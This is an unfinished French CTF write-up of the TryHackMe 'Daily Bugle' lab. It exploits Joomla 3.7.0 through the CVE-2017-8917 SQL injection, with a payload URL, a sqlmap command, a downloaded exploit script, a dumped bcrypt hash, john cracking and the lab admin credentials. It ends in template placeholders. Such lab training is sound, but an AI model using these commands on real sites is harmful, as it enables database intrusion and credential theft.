---
title: "Daily Bugle - TryHackMe Writeup"
date: 2026-02-28
categorie: [TryHackMe, CTF]
layout: post
difficulty: Hard
platform: TryHackMe
tags: [Joomla, CVE-2017-8917, John, bcrypt]
---
### Objectif

Compromettre un compte Joomla CMS via une injection SQL, récupérer des hashs de mot de passe à casser puis faire une escalade de prvilèges en tirant parti de yum.

### Task1: Deploy

Question: Access the web server, who robbed the bank?

```
spiderman
```

---

Task2: Obtain user and root

Nous avons détecter la présence du fichier robots.txt 

![Image 1](/assets/daily-bugle/1.png)

En ouvrant ce répertoire, nous avons découvert qu'une instance de Joomla était exécutée sur ce site web.

![Image 2](/assets/daily-bugle/2.png)

Nous avons donc exécuté joomscan sur ce site web et découvert que la version 3.7.0 était utilisée.

```bash
joomscan -u http://lab.thm
  ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://lab.thm ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

```

Nous avons immédiatement recherché des exploits publics pour cette instance installée à l'aide de searchsploit et avons découvert que la version 3.7.0 était vulnérable à l'injection SQL via le paramètre com_fields.

```markdown

URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

```

Vu qu’il nous est indiqué de préférer un script python à sqlmap alors on vas utiliser ceci qui nous proviens du repo github de  BaptisteContreras

```bash
wget https://github.com/BaptisteContreras/CVE-2017-8917-Joomla/blob/master/main.py
python3 main.py lab.thm
```

Le script est conçu pour ajouter le shema http donc suffit de préciser le nom de domaine ou l’adresse ip.

Ce script nous permet de récupérer les informations de la table users

```bash
 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ||| 0 ||| 1 ||| 2019-12-14 20:43:49 ||| 2019-12-15 23:58:06 ||| 0 |||  ||| 0000-00-00 00:00:00 ||| 0 |||  |||  ||| 0

```

On récupère donc le hash

```
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Ensuite on utiliser [`https://hashes.com/en/tools/hash_identifier`](https://hashes.com/en/tools/hash_identifier) pour identifier le type de hash. Il nous révèle que c’est `bcrypt`. On copie ensuite ce hash dans un fichier pour le cracker avec john.

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Image 3](/assets/daily-bugle/3.png)

Nous avons reçu des identifiants en clair. 

```
username : jonah
password: spiderman123
```

Nous nous sommes connectés au panneau d'administration et pouvons désormais accéder au tableau de bord !

### Commandes utilisées

```sql
[Tes payloads SQL]
```

### Leçons apprises

- [Ce que tu as appris]
- [Erreurs faites]

### Ressources

- [Liens vers docs]